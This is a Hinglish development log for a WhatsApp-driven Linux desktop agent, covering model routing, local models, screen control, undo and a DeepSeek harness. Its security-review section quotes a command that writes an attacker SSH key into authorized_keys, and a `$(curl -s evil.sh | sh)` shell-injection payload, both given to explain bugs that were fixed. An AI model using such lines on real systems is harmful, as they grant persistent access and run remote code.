# BUILD-LOG.md — jo banaya, kaise banaya, kya toota, kaise theek hua

## v2.9.0 — DeepSeek Harness (`@deepseek-ai/dsh`) on Fedora Linux + Full WhatsApp Power 🚀

- **Real world constraint**: DeepSeek ka official Desktop installer abhi sirf macOS/Windows ke liye hai — Linux ke liye unka official open-source agent engine **`@deepseek-ai/dsh`** (`0.2.1-rc.2`, MIT, Node `>=22.19` ya `>=24`) hai. Alag third-party WhatsApp plugin lagane se second competing WhatsApp linked device banta aur Fedora desktop/OCR/PWA tools cut ho jaate.
- **Asli traps jo live Linux run me pakde gaye aur theek kiye**:
  1. `DSH_TELEMETRY_MODE=OFF` Cordis schema warning deta hai — exact valid enum `DSH_TELEMETRY_MODE=DISABLED` hai.
  2. Cordis `--patch` YAML me existing base plugin (`llm-pi-ai`) top-level `- id: llm-pi-ai` se patch hota hai, jabki naya host plugin (`@deepseek-ai/dsh-mcp-client`) **hamesha `- insert:` array ke andar** hona chahiye (`- insert: [{ id: mcp-observer, name: ..., config: ... }]`), warna silently ignore ho jata hai.
  3. `dsh` launcher parser me `--profile web --patch <file>` **hamesha `--port` / `--no-open` se pehle** aana chahiye warna `--patch` web app ko forward hoke `unknown option '--patch'` throw karta hai.
  4. `dsh web` `127.0.0.1` pe bind hota hai aur `Host` header authority ke against `dsh-auth-*` cookie sign karta hai — isliye `src/harness.js` har LAN/Tailscale IP ke liye `--trusted-host <ip>:3081` pass karke pure-Node HTTP + WebSocket `upgrade` tunnel proxy chalata hai, taaki Fedora PC (`127.0.0.1:3080`) aur Phone/Tailscale (`<PC-IP>:3081`) **dono** pe 100% official DeepSeek Harness Web UI bina kisi path-rewrite bug ke chale!
- **Files added / upgraded**:
  - `src/harness.js` — Warm persistent `dsh --profile sdk` JSON-RPC 2.0 daemon, zero-sudo portable Node `v22.22.0` + `@deepseek-ai/dsh` auto-installer, multi-brain provider sync (`deepseek`, `deepseek-account`, `observer-groq`, `observer-openrouter`, `observer-local` llama.cpp, `observer-ollama`), `dsh web` + LAN tunnel manager, aur Fedora GNOME `.desktop` launcher.
  - `src/mcp-server.js` — Zero-dep stdio MCP server (`mcp-observer`) sharing live `whatsapp_send_message`, `whatsapp_send_file`, `whatsapp_send_screenshot`, `pc_screenshot` (image + OCR), `pc_ui_act`, `pc_system`, `observer_action`, aur `observer_memory` across both WhatsApp `/dsh` and browser `dsh web` sessions!
  - `src/commands.js`, `src/whatsapp.js`, `src/server.js`, `src/nlp.js`, `src/actions.js`, `src/doctor.js`, `webapp/`, `scripts/observer.sh`, `FEDORA.md`, `test/harness.test.js`.

---

> Ye file poore 2.0 ka **honest engineering log** hai: har feature, har command,
> har error jo asli machine pe aaya, aur uska exact fix (commit ke saath).
>
> Branch: `arena/20378d42-psd-observer` · Files: 41 changed, **+7190 / −452**
> · Final state: **61 PC actions**, **44 tests pass**, ₹0 cost.
>
> ### ⚠️ Dhyaan do: is project me **git use nahi hota**
>
> Owner git nahi chalata — koi `git clone`, `git pull`, `git status` nahi.
> Install/update **sab kuch plain `curl` se** hota hai (tarball download →
> extract). Isliye poore doc me jo bhi install/update step hai wo curl wala hai.
> Timeline me jo `b6faa21` jaise **commit hashes** likhe hain, wo sirf **record**
> ke liye hain (kya kab bana) — unhe chalane ki zaroorat kabhi nahi padti.
>
> Yahi wajah hai ki dono helper scripts bane:
> `install-fresh.sh` (pehli install) aur `update-from-github.sh` (baad ke updates).

---

## 2.1 — `/agent` fix + workload routing (is branch pe)

**Problem jo owner ne report kiya:** `/agent <task>` bina kuch kiye screenshot
bhej deta tha aur bolta tha "ho gaya" — website bhi nahi khulti thi. Saath hi AI
har message pe wahi model use karta tha (chhote kaam ke liye bada model, bade
kaam ke liye chhota) — power waste aur kam power, dono.

**Root cause (exact):** `commands.js` ka `/agent` hard-coded step list banata tha:

```js
const task = `open agent | type ${prompt} | key enter | wait 6 | screenshot`;
return autopilot.runAutopilot(task, ...);
```

aur `autopilot.runAutopilot()` har haal me `🤖 Autopilot done (N steps)` +
screenshot return karta tha — chahe `xdg-open` fail ho, chahe browser na khule,
chahe typing kisi random window me chali jaye. Koi verification nahi thi, aur
`/agent` khud kuch karta hi nahi tha (kaam kisi doosri website ko de raha tha).

**Fix:**

| File | Change |
|---|---|
| `src/router.js` (naya) | task ko tiny/light/standard/heavy me size karta hai; model catalog (local + free cloud) quality/speed/cost ke saath; cooldown + hourly heavy budget; `/brains` text |
| `src/agentloop.js` | router se model order; tier ke hisaab se steps/tools; fail hone pe agla (bada) brain; same tool call repeat detect; `lastRun` me model/tier/steps |
| `src/ai.js` | chat/complete bhi router se; photos vision-capable model ko (local pehle, phir Gemini) |
| `src/autopilot.js` | `open` ab naya window aane ka wait karta hai (wmctrl; Wayland pe screen-diff), `type` galat window me nahi karta, tap sirf OCR/vision (blind coordinates off), har step ok/fail, fail pe "step N pe ruk gaya" |
| `src/commands.js` | `/agent` = real task, `--plan/--web/--fast/--deep`; naya `/brains`; `/arena` purana shortcut alag se; `/do` same engine |
| `src/imaging.js` | `imageSignature` / `imageSimilarity` / `screenChanged` — "screen badla ya nahi" |
| `src/apps.js` | `windowTitles()` — automation ko verify karne ke liye |
| `src/pccontrol.js` | URL open: xdg-open → gio → firefox/chromium/chrome/brave chain, saaf error |
| `src/config.js` + `.env.example` | model sizes, `ROUTER_PREFER`, cooldowns, `MAX_HEAVY_PER_HOUR`, `AI_TIMEOUT_MS`, `ALLOW_BLIND_CLICKS=false` |
| `src/server.js` | `GET /api/brains` + `/api/status` me brains list |

**Verification (offline tests, 69 pass):**

- `/agent` with no brain → "kuch bhi nahi kiya", **no screenshot**
- failed `open` → `step 1/1 pe ruk gaya`, **not** "done"
- model ne bina tool call ke "ho gaya" bola → loop nudge karke asli tool call karwata hai
- nudge ke baad bhi bina tool "ho gaya" → reply: "Kuch nahi hua… main use sach nahi maanta" (fabricated success kabhi accept nahi)
- tiny task → local fast model; standard → capable model; local 14B ho to local
- failing brain → cooldown; heavy budget → standard pe downgrade
- `screenshot bhej do` → vision model **nahi** maangta

---

## 2.2 — sab kuch local (Hugging Face + llama.cpp)

Owner ne bola: "mereko sab local chahiye, aaj kal acche models aa rahe hain,
Hugging Face se download command de do, local run karunga."

Kya bana:

| Cheez | Kahan |
|---|---|
| Naya provider `local` (OpenAI-compatible: llama.cpp / LM Studio / vLLM) | `src/router.js`, `src/ai.js`, `src/agentloop.js` |
| Config: `AI_PROVIDER=local`, `LOCAL_API_URL`, `LOCAL_MODEL`, `_SMALL/_HEAVY/_VISION` | `src/config.js`, `.env.example` |
| Download + serve + wire + systemd, ek script se | `scripts/local-models.sh` |
| Guide: kaunsa model kis RAM pe, exact `hf download` commands, quants | `LOCAL-MODELS.md` |
| `/doctor` + `/model` me local server check | `src/doctor.js`, `src/ai.js` |
| Tests (fake llama-server): tools, chat, vision, dead server | `test/local.test.js` (9) |

Model shortlist (Oct 2026, Hugging Face pe verified):

- `unsloth/Qwen3.8-27B-GGUF` — best overall, vision + agentic, UD-Q4_K_XL ~17.9 GB
- `ggml-org/gemma-4-26B-A4B-it-GGUF` — MoE (4B active), CPU laptop ka best
- `unsloth/gpt-oss-20b-GGUF` — reasoning + tools
- `ggml-org/gemma-4-12B-it-GGUF` — vision + 256K ctx, 7.4 GB
- `unsloth/Qwen3.5-4B-GGUF` / `-0.8B-GGUF` — laptop / tiny slot

`AI_PROVIDER=local` = cloud fallback **kabhi nahi**. Photos local vision model
se, OCR local tesseract se, voice local whisper.cpp se — sab PC pe.

## 2.3 — ek hi script (`observer.sh`)

Owner: "bhai inhe combine karke ek hi script dede." Pehle 8 alag scripts the
(`install-fresh`, `install-fedora`, `update-from-github`, `local-models`,
`install-systemd`, `relink-whatsapp`, `setup-remote`, `fix-desktop`) — yaad
rakhna padta tha kaunsa kab chalana hai. Ab ek file:

```bash
bash observer.sh <command>
```

| Command | Purana script | Kya karta hai |
|---|---|---|
| `install` | `install-fresh.sh` | tarball curl → `~/observer-agent` → `.env` → `npm install` |
| `update` | `update-from-github.sh` | backup → code swap → npm → restart (`.env`/`auth_info`/`data` safe) |
| `models …` | `local-models.sh` | Hugging Face GGUF: list/recommend/detect/download/serve/wire/setup/ollama/status |
| `service …` | `install-systemd.sh` | systemd unit install/restart/status/logs/enable/disable/uninstall |
| `relink` | `relink-whatsapp.sh` | naya QR |
| `remote` | `setup-remote.sh` | Tailscale se phone app bahar se |
| `fix` | `fix-desktop.sh` | screenshot/keyboard/mouse (Wayland) |
| `doctor` | — | kya toota + exact fix |
| `start` / `version` / `help` | — | foreground run, local vs remote version, help |

Purane teen user-facing naam ab **thin wrappers** hain jo `observer.sh` ko
forward karte hain (`--fresh <dir>` bhi `install --dir` me translate hota hai).
Koi git nahi — script khud tarball `curl` karta hai.

Bug jo testing me mila: `trap 'rm -rf "$tmp"' EXIT` + `set -u` → function ke
baad `tmp` local scope se bahar chala jata tha, script exit pe
`line 1: tmp: unbound variable` deta tha (aur temp folder delete nahi hota).
Fix: `trap "rm -rf '$tmp'" EXIT` (value trap lagte waqt hi expand ho jati hai).

## 2.8.2 — screenshot auto-delete

Owner: "jo screenshot kheech ke bhej chuka hota hai uska use nahi hota — 2 ya 5
minute me khud delete ho jaye."

### Pehle kya hota tha

- `captureScreenshot()` har baar `<tmp>/observer-shot-<ts>.png` banata tha aur
  **success pe bhi delete nahi karta tha** — /tmp me screenshot jama hote rehte.
- Wayland portal asli screenshot `~/Pictures` me likhta hai. Hum use padh ke
  bhej dete the, file padi rehti — hamesha ke liye.

### Ab (`src/screenshots.js`)

| File | Kab delete |
|---|---|
| `<tmp>/observer-shot-<ts>.png` | **turant**, buffer padhne ke baad (leak hi nahi) |
| `~/Pictures/Screenshot*.png` (portal ne likhi, humne padhi) | TTL ke baad — default **4 min**, 30s check |
| Crash se bachi `observer-shot-*.png` | TTL ke baad, naam se sweep |

- TTL: `SCREENSHOT_TTL_MINUTES=4` (2–5 recommended; 1–30 hard clamp). Off:
  `SCREENSHOT_CLEANUP=false`.
- Ledger `data/shots.json` — restart ke baad bhi purani captured file clean hoti hai.
- **Safety**: sirf wahi paths delete hote hain jo agent ne khud capture kiye
  (`observer-shot-*.png` temp me, ya portal ki likhi file pictures folder me).
  Owner ki apni files, downloads, shared, recordings, webcam — chhoote hi nahi.
  Folder ke bahar ka path ledger me aa jaye to ignore.
- `/shots` — TTL + kitni files padi hain · `/shots clean` — abhi saaf.
- Janitor fail ho to sirf warn, agent nahi girta; shutdown pe bhi ek aakhri safai.

### Files

| File | Kya |
|---|---|
| `src/screenshots.js` | *naya* — TTL, ledger, sweep, janitor, /shots report |
| `src/pccontrol.js` | temp copy turant delete, portal file track |
| `src/commands.js` | `/shots`, `/shots clean`, HELP |
| `src/index.js` | janitor start/stop |
| `src/config.js`, `.env.example` | `SCREENSHOT_TTL_MINUTES`, `SCREENSHOT_CLEANUP` |
| `test/screens.test.js` | *naya* — 10 tests (TTL clamp, restart, sweep, safety, timer, /shots) |

Tests: **182 pass**.

---


## 2.8.1 — screen: on-demand frames, aur sab commands wahin

Owner ne seedha pakda: "na har 5–10 sec me screenshot, na har 1 sec — aur
saare commands bhi chale."

### Kya galat tha

2.8.0 ka Screen tab har **2.5 s** me `/api/screen` maarta tha. Har request pe PC
screenshot leta hai — Wayland pe har capture portal ka "share your screen"
prompt bhi la sakta hai. 10 minute ka phone session = ~240 screenshots, bina
kisi wajah ke.

### Ab

| Trigger | Screenshots |
|---|---|
| Tab kholna | 1 |
| **Refresh** dabana | 1 |
| Screen pe tap | **0** (frame ka size server yaad rakhta hai) |
| Tap ke baad naya frame | 1 (dekhne ke liye) |
| Type / key bhejna | 0 + 1 frame |
| Kuch na karna | **0** — koi timer nahi |

- `setInterval(loadScreen, 2500)` hata diya. `visibilitychange` pe sirf ek fresh
  frame (phone wapas aaya to screen badal chuki hogi).
- `GET /api/screen` ab **ETag** deta hai; same screen pe `304 Not Modified` —
  image dobara download nahi hoti, page wahi frame rakhta hai.
- `POST /api/tap` pehle apna screenshot leta tha size jaane ke liye. Ab last
  frame ka size use karta hai → tap = zero extra capture.
- Server me `screen` deps inject ho sakte hain, isliye test exactly count karta
  hai ki ek tap me kitne screenshots hue (0).

### Commands console (Screen tab)

Screen dekhte-dekhte hi sab commands: `/help`, `/brief`, `/usage`, `/watch list`,
`/undo`, `/use …` — `POST /api/chat` hi hai (same agent, same safety gates),
bas output screen ke neeche dikhta hai. Screenshot wale commands (`/screenshot`,
`/look`, `/tap`) ka result image console me aata hai aur screen bhi refresh hoti hai.

Quick chips: `/help · /brief · /usage · /watch list · /undo list · /screenshot · /status`.

### Files

| File | Kya |
|---|---|
| `webapp/app.js` | polling hataya, ETag fetch, tap pe 0 capture, console + chips |
| `webapp/index.html` | Screen tab me Commands card, naya text |
| `webapp/styles.css` | `.cmd-out` / `.cmd-line` |
| `src/server.js` | ETag + 304, `screen` deps inject, tap last-frame size se |
| `test/features.test.js` | 3 naye tests: etag, "tap me 0 screenshot", PC-control off |

Tests: **172 pass**.

---


## 2.8.0 — bharosa + poora reach: undo, watch, usage, teach, brief, resume, remote screen

Owner ne kaha: "sab daal de, bas 9 wala step kahin se bhi control hone chahiye."
2.7.0 ke `/stop` + vision ke upar 10 cheezein, saari local-first.

### 1. `/undo` — galti wapas (`src/journal.js`)

Har file-changing action ka receipt: `data/journal.json` + `data/undo/` me chhote
backup (max 512 KB). Undo support: write (purana content wapas), delete (backup
se restore), move (wapas), copy (copy delete), mkdir (khali folder hatao), zip
(archive delete). 40 entries tak; bade file record hote hain "undo nahi ho
sakta" — jhooth nahi bolta.

### 2. `/watch` — "jab ye ho jaye to batao" (`src/watch.js`)

Condition + timer → screenshot → vision model → **YES / NO / MAYBE** (strict
parse, Hinglish "haan" bhi). YES pe screenshot + alert, phir 10 min cooldown
(condition sach reh jaye to spam nahi). `once` ek baar. 3 fail ke baad watch
khud band + owner ko batata hai. Store me persist — restart pe bhi zinda.

### 3. `/usage` — quota ka hisaab (`src/usage.js`)

`router.record()` pe hook: har call store me (per model, per din, 14 din).
`/usage` me aaj ke calls, average latency, provider limits aur 80% pe warning.
Groq 1000/day/model, OpenRouter 50/day (fresh), Gemini "per-project, AI Studio
dekho", local unlimited — jo pata nahi use jhooth nahi bolta.

### 4. `/teach` — ek baar karo, hamesha ke liye (`src/macro.js`)

`/teach start morning` → jo commands chalao wo record hoti hain → `/teach stop`
→ `/morning` pe poora sequence. Sirf successful commands record hoti hain
(warna replay pe phir fail hoti). Save existing `learned` list me — replay
wahi tested `runLearned` path hai, naya interpreter nahi.

### 5. `/brief` — din ki tasveer (`src/brief.js`)

Reminders (overdue + aaj), todo, aaj ke cron jobs, active watches, disk,
battery, uptime, adhoora task. Sab local (`/proc`, store) — zero tokens.
`/brief on 9am` ek cron job banata hai; cron ab **commands** bhi chala sakta hai
(`runDueJobs`), isliye scheduled `/brief` bilkul wahi code hai jo manual.

### 6. `/resume` + live progress

Long task shuru hote hi `lastTask` store hota hai; clean finish pe `done`.
`/stop` ke baad `/resume` wahin se. Saath me `src/progress.js`: hands loop ka
har step WhatsApp pe "⏳ Hands · step 2/8 · click Search" (7s throttle, send fail
pe chup-chaap band — task kabhi nahi rukta).

### 7. Photo → diagnosis

"ye error fix karo" caption ke saath photo bhejo: vision pehle error padhta hai,
phir Hinglish me "kya galat + exact next step". Jo error dikh nahi raha use
invent nahi karta.

### 8. Kahin se bhi control (step 9)

Teen raaste, teeno free:

| Raasta | Kya milta hai |
|---|---|
| WhatsApp (duniya me kahin se) | `/screenshot`, `/tap 500 320`, `/tap Login`, `/pc type`, `/use` |
| Phone app, same Wi-Fi | naya **Screen** tab: 2.5s live frames, tap-to-click, type box, keys |
| Tailscale (`observer.sh remote`) | wahi phone app ghar se bahar bhi — koi port forward nahi |

Server routes: `GET /api/screen` (JPEG, token-protected), `POST /api/tap`
(0-1000 relative ya pixels), `/api/key`, `/api/type`. Sab bridge token ke peeche,
`ALLOW_PC_CONTROL=false` se band.

### 9. Auto-update

`observer.sh autoupdate on [--time 03:00]` → systemd user timer, raat 3 baje
(jitter 45 min) update + restart. 2.7.0 ka update message phir WhatsApp pe
report deta hai (kya naya + kitna time).

### Files

| File | Kya |
|---|---|
| `src/journal.js` | *naya* — file op receipts + undo |
| `src/usage.js` | *naya* — per-model/day quota + report |
| `src/watch.js` | *naya* — screen-condition watchers |
| `src/macro.js` | *naya* — /teach recorder + replay |
| `src/brief.js` | *naya* — daily brief + scheduling |
| `src/progress.js` | *naya* — throttled live progress |
| `src/router.js` | `setRecordHook()` — usage ko har call dikhti hai |
| `src/actions.js` | file ops journaled; `computer_use` live progress |
| `src/commands.js` | 8 naye commands, resume/teach/brief wiring |
| `src/server.js` | `/api/screen`, `/api/tap`, `/api/key`, `/api/type` |
| `webapp/*` | Screen tab (live + tap), key pad, type box |
| `scripts/observer.sh` | `autoupdate on/off/status` |

Tests: **169 pass** (142 + 27 naye `test/features.test.js`).

---


## 2.7.0 — *stop button*, screen ko aankhein, aur update ki khabar

Teen cheezein maangi gayi thi:

1. **Update hone pe WhatsApp message** — kya update hua + kitna time laga.
2. **`/stop`** — chalta hua kaam *beech me* rukna chahiye, stacked kaam bhi.
3. **Tez + asli screen reading** — OCR nahi, seedha vision (Gemini ya jo bhi
   connected API model ho).

### 1. `/stop` — har cheez ke andar ek hi cancel signal

Naya `src/cancel.js`:

```
StoppedError (code: ESTOPPED)  ─┐
sleepWith(ms, signal)          ─┼─ ek hi signal poore tree me
createTaskRegistry()           ─┘   begin/run/stop/stopAll/active/size
```

- `commands.js` ka `handle()` **sabse pehle** stop-word dekhta hai — dedupe aur
  "ek kaam chal raha hai" busy-check se bhi pehle. Isliye jab koi command chal
  raha ho tab bhi `/stop` andar aa jaata hai.
- `whatsapp.js` me ek batch ke andar pehle `/stop` waale messages process hote
  hain, baaki queue me rehte hain. Pehle sequential await ki wajah se stop
  line ke peeche atak jaata tha.
- Signal `runHands`, `runArenaPrompt`, `agentLoop.run`, `autopilot`, `downloadUrl`,
  `recordScreen`, `run_shell` — sab tak jaata hai. `curl`/`ffmpeg`/`wf-recorder`
  child process abort pe mar jaate hain, adhoori download file delete hoti hai.
- Ruka hua command `null` return karta hai → sirf `/stop` ka reply jaata hai,
  cancelled kaam ka "⚠️ failed" message nahi.
- Reply me har task ka label, step count aur seconds: `⏹ *Roka gaya* — 2 task(s)`.

Stop words: `/stop`, `/cancel`, `/abort`, `/ruko`.

### 2. Screen ab OCR nahi — asli vision

Pehle: screenshot → tesseract OCR → word ids → model ko text.
Ab (`HANDS_USE_OCR=false` default): screenshot → **1024px JPEG q70** →
vision model khud screen dekhta hai.

- `ai.screenStep()` provider order: **Gemini → Groq (`qwen/qwen3.8-27b`) →
  OpenRouter (`gemma-4-31b-it:free`) → local llama.cpp → Ollama**.
  `SCREEN_PROVIDER` se force kar sakte ho.
- `ALLOW_CLOUD_SCREEN=false` → sirf local/Ollama vision (screenshot PC se bahar
  nahi jaata).
- OCR ab **lazy**: sirf tab chalta hai jab text target ko exact pixels pe snap
  karna ho. Normal coordinate path pe tesseract bilkul nahi chalta.
- Speed: OCR step hata, image 1024px JPEG (kam tokens, chhota upload),
  settle 550ms, `HANDS_MAX_TOKENS=512` (pura JSON jawab aata hai).

### 3. Update hone pe message

`src/updates.js` + `observer.sh`:

- `observer.sh update` restart se pehle `data/last-update.json` likhta hai:
  `{"from":"2.6.0","to":"2.7.0","at":...,"seconds":87,"via":"observer.sh"}`.
- Jab WhatsApp connect hota hai, `announceUpdate()` version/brain-set badla
  dekhta hai aur bhejta hai:

```
🔄 *Observer updated* · 2.6.0 → 2.7.0 · 1m 42s
• /stop — chalta hua kaam turant rukta hai…
• Screen ab OCR nahi — screenshot seedha vision model…
```

- Pehli install pe chup rehta hai (2.7.0 se pehle ka koi message spam nahi).
- Bhejne me fail hua to version yaad nahi rakhta — agle connect pe dobara try.

### Files

| File | Kya |
|---|---|
| `src/cancel.js` | *naya* — StoppedError, sleepWith, task registry |
| `src/updates.js` | *naya* — update marker, message, announce |
| `release-notes.json` | *naya* — har version ke bullets (message inhi se banta hai) |
| `src/commands.js` | `/stop` dispatch, signals, `/status` running line |
| `src/whatsapp.js` | batch me `/stop` pehle, onConnected hook |
| `src/actions.js` | har tool me `ctx.signal`, stop = error nahi |
| `src/hands.js`, `src/ai.js` | vision-first, `screenStep()` provider order |
| `test/control.test.js` | *naya* — 23 tests (stop, registry, hands abort, updates) |

Tests: **142 pass** (118 + 24 naye).

---


## 2.6.0 — *hands*: computer ko insaan ki tarah chalana

Owner ne `main` pe `Agent-S-main.zip` daala (commit `8154afe`, Simular ka
open-source computer-use agent — Agent-S/S2/S3) aur bola: "is WhatsApp model ke
paas *actual hands* aa jaane chahiye". Zip padha, architecture samajhi, aur uska
asar hamare Node agent me utaara.

### Zip me kya tha (aur kya use kiya)

| File | Idea jo adopt ki |
|---|---|
| `gui_agents/s3/agents/worker.py` | ek turn = ek action; har step pe screenshot dobara |
| `gui_agents/s3/agents/grounding.py` | **do tarah ki grounding**: text target word-id se exact, warna model ke relative coordinates (0-1000) |
| `gui_agents/s3/memory/procedural_memory.py` | strict output format + "jo fail hua dobara mat karo" + done/fail action |
| `gui_agents/s1/aci/LinuxOSACI.py` | Linux pe actions = mouse/keyboard events, koi API nahi |
| `gui_agents/s3/bbon/*` | best-of-N — *nahi* liya: free tier pe 8 steps × N rollouts mehnga hai |

Aisa hi nahi kiya: Agent-S Python + `pyautogui` + UI-TARS grounding model maangta
hai. Uska grounding model free tier pe nahi hai, aur `pyautogui` Wayland pe
kaam nahi karta. Hamare paas pehle se `pccontrol` (xdotool/ydotool/wtype) hai —
bas uske upar loop chahiye tha.

### Naya module: `src/hands.js`

```
screenshot → OCR (local, free) → vision model se EK action (JSON) →
click / type / scroll / drag → 900ms settle → dobara screenshot → …
```

- **Word-id grounding**: har OCR word ka id prompt me jaata hai (`12 | Send | 870,940`),
  model `{"action":"click","word":12}` bolta hai → hum us word ke exact box ke
  centre pe click karte hain. Icons ke liye `target` + `x,y` (0-1000).
- **Ek action, ek step** — burst clicking nahi. Agli baar screenshot dekh ke hi
  agla faisla.
- **Stuck detection**: wahi action 3 baar + screen nahi badli → run rukta hai
  (`same action 3 baar, screen nahi badli — stuck`), budget jalane ke bajaye.
- **Bina kaam kiye "done" nahi maanta**: pehle step pe hi `done` aaya to ek baar
  poochta hai ("abhi kuch kiya hi nahi") — phir bhi wahi bole to answer me saaf
  likhta hai `koi action nahi kiya — screen pehle se hi aisi thi`.
- **Budgets**: 8 steps / 240s default (`HANDS_MAX_STEPS`, `HANDS_MAX_SECONDS`);
  screenshot 1280px pe downscale (sharp) — Groq/Gemini free-tier image limits ke andar.
- **Honest output**: har line asli tool result hai; fail pe `❌ reason` + screenshot,
  kabhi fake "ho gaya" nahi. Reply me model + vision calls + cloud/local note.

### Safety (jaan bujh ke tight)

Action allowlist: `click, double_click, right_click, type, key, scroll, drag,
move, wait, open, focus, done, fail`. Shell **nahi**. Model ko rules me saaf
likha hai: password/OTP/card kabhi type nahi, Delete/Uninstall/Logout bina kahe
nahi. `type` pehle clipboard-paste se jaata hai (unicode/newlines safe), warna
per-char typing.

### Privacy

Screenshot vision model ko jaata hai. Local vision (`OLLAMA_VISION_MODEL` /
`LOCAL_API_URL_VISION`) ho to sab PC pe. Nahi ho to free cloud tier (Gemini/Groq)
dekhta hai — `ALLOW_CLOUD_SCREEN=false` se band, phir hands sirf local vision pe
chalega. Reply me har baar likha hota hai ki screen kahan gayi.

### Kahan se chalta hai

```bash
/use YouTube kholo aur lofi music chalao     # direct
/use --steps 12 Settings me Bluetooth on karo
/agent instagram kholo aur pehli story dekho # brain khud computer_use tool call karta hai
/agent --use settings me bluetooth on karo    # heuristic skip, seedha screen control
```

`computer_use` registry me `standard` level ka tool hai, aur `agentloop` usko
har request me available rakhta hai (`ALWAYS` list) — kyunki visual kaam sirf
wahi tool kar sakta hai.

### Naye tests (20)

`test/hands.test.js`: coordinate normalisation (0-1 vs 0-1000 vs pixels), JSON
nikalna prose/fences se, har action ka parse + clamp, bad/dangerous reply reject
(`run_shell`), word-id grounding, prompt me word table, loop ke 6 cases (happy
path, invalid reply retry, model fail, stuck, step budget, screenshot fail),
`computer_use` tool schema, `/use` ka usage + safe-mode refusal, aur local vision endpoint (LOCAL_API_URL_VISION akela bhi kaam kare).

```bash
npm test    # 118 pass
```

---

## 2.5.4 — "page khul gaya phir bhi *page load nahi hua*"

Owner ne screenshot bheja: `/agent arena.ai/agent pe hello likho` → 22s me
step 1/5 fail:

```
❌ 1. open "https://arena.ai/agent" → browser khola par page load nahi hua (20s wait)
```

…jabki page khul gaya tha aur box cursor ke saath **already focused** tha.

### Root cause: "verify nahi hua" ko "fail" samajh liya

`open` step naya window **title** dhoondta tha (`wmctrl -l`). Do wajah se title
kabhi aata hi nahi:

1. **Wayland** — `wmctrl` X11-only hai, GNOME Wayland pe list khali aati hai.
2. **Existing browser window** — naya page tab me khulta hai, naya window nahi.
   Firefox tab ka title badal de to bhi `wmctrl` list me kuch naya nahi hota.

Dono me 20s baad "page load nahi hua" throw hota tha, chahe screen pe page ho.
Screen-change fallback sirf ek hi branch me chalta tha.

### Fix 1 — teen-value verdict, `openVerdict()`

Naya pure function (`src/autopilot.js`) jo sirf **saaf evidence** pe fail karta hai:

| Observation | Result |
|---|---|
| naya window title mila | ✅ proved (`window "…"`) |
| screen badal gayi | ✅ chala, par `unverified` (screenshot se confirm) |
| browser pehle band tha, ab chal raha hai | ✅ chala (`unverified`) |
| browser chal raha hai, title/screen verify possible nahi | ✅ chala (`unverified`) |
| browser pehle se khula, screen readable thi aur *bilkul nahi badli* | ❌ fail (type karna khatarnaak) |
| koi browser process hi nahi | ❌ fail |

Isi verdict se `finish()` me line aati hai:
`ℹ️ 1 step(s) apne aap verify nahi ho paye … browser focus karke aage badha`.

Saath me: `browserRunning()` (`ps -A -o comm=`) aur `focusAnyBrowser()` — verify
na ho to bhi browser window focus hoti hai, taaki typing composer me jaaye.
`type` ka safety gate bhi ab "browser focus karke dobara check" karta hai,
par **non-browser window me typing abhi bhi band** hai.

### Fix 2 — site table: box pehle se focused hai (`src/sites.js`)

Har chat site (Arena, LMArena, ChatGPT, Claude, Gemini, DeepSeek, Grok,
Perplexity, Kimi, Poe, Copilot, Qwen…) ka profile: `autofocus: true`,
`readyMs`. Matlab plan ab:

```
open → type (clipboard) → Enter → wait 8s → look → screenshot
```

- koi `tap`/`click` step nahi (purana flow blind-click karta tha; OCR galat
  "Send" pakadta to text sidebar me chala jata),
- composer pe aimed `tap` step aaye to **skip** hota hai (reason ke saath),
- 8s wait (20s nahi) — page khula hai to type turant,
- **ek hi Enter** — pehle `type submit:true` + alag `key enter` dono chalte the
  (double submit ka risk).

Non-chat sites ka purana behaviour waisa hi hai.

### Fix 3 — `extractPrompt` domain kha raha tha

`arena.ai/agent pe likho hi bro` → typed text `.ai/agent likho hi bro`.
Domain `arena.ai` sirf aadha strip hota tha kyunki `arena` site-word pehle
hataya jaata tha. Ab pehle poora domain (`arena.ai/agent`) jaata hai, aur
cleanup fixpoint tak loop karta hai (trailing `bhejo`/`karo`/`aur` ek saath).

```js
extractPrompt('arena.ai/agent pe likho hi bro')      // 'hi bro'
extractPrompt('claude.ai pe likho: explain k8s')     // 'explain k8s'
extractPrompt('arena.ai/agent pe hello likho aur bhejo') // 'hello'
```

Verify:

```bash
npm test    # 98 pass (5 naye tests: sites, steps, domain, verdict x2)
```

---

## 2.5.3 — code review: teen asli security bugs

Owner ne bola "5-10 minute code check kar". Poora `src/` (10,083 lines) padha,
path guards fuzz kiye, aur teen cheezein mili jo **tests me nahi pakdi gayi thi**:

### 1. Protected folders sirf read pe block the, **write pe nahi** (serious)

`files.js` me block-list (`~/.ssh`, `~/.gnupg`, `auth_info`, keyrings) sirf
`mustExist: true` branch me chalti thi. Matlab:

```
/write ~/.ssh/authorized_keys | ssh-ed25519 AAAA…
```

…actually kaam karta tha — persistent SSH access. `~/.gnupg/gpg.conf` aur
WhatsApp creds bhi overwrite ho sakte the. Ab `isBlocked()` dono branches me
chalti hai (naye file/folder ke parent pe bhi). Regression test added.

### 2. TTS me shell injection (festival engine)

`tts.js` festival ke liye `sh -c "echo … | text2wave -o …"` use karta tha.
`sanitizeForTTS()` balanced backticks hataata hai par `$(…)` nahi — matlab
`/voicereply $(curl -s evil.sh | sh)` shell me chalta. Ab `text2wave` ko seedha
`spawn('text2wave', ['-o', wav], …)` + stdin se text, koi shell nahi.

### 3. Bridge token ka comparison timing-safe nahi tha

`server.js` me token `===` se compare hota tha (LAN pe byte-by-byte timing
leak). `safeEqual()` file me pehle se maujood thi, bas token pe use nahi ho rahi
thi. Ab teeno jagah (header, bearer, query) constant-time compare.

Baaki review (jo theek mila): path traversal (`../`, `/etc/passwd`, symlink
parents) blocked; owner-only gate solid; shell PIN gate; `/api/*` sab token ke
peeche; `spawn()` sab jagah argv arrays (sirf TTS exception tha).

Verify:

```bash
npm test    # 93 pass (3 naye tests)
```

---

## 2.5.2 — `/open` ka fuzzy match kisi bhi bakwaas naam pe app khol deta tha

Owner ke PC pe test fail: `/open definitely-not-an-app-xyz` ne asli app khol di —
**"Observer App"**. Sandbox me koi .desktop app nahi, isliye wahan test pass
tha; owner ke Fedora pe Observer installed hai.

**Root cause:** `matchApp()` ka last-resort tier 20 — query ka **koi ek** word
(>=3 letters) app ke naam ke kisi word se start ho jaye to match. Query ke
tokens: `definitely not an app xyz` → `app` ne "Observer **App**" pakad liya.
Matlab koi bhi lamba bakwaas sentence jisme "app" ho, Observer App khol deta.

**Fix:** tier 20 ab sirf chhoti query pe (<= 3 words) chalta hai **aur** tab jab
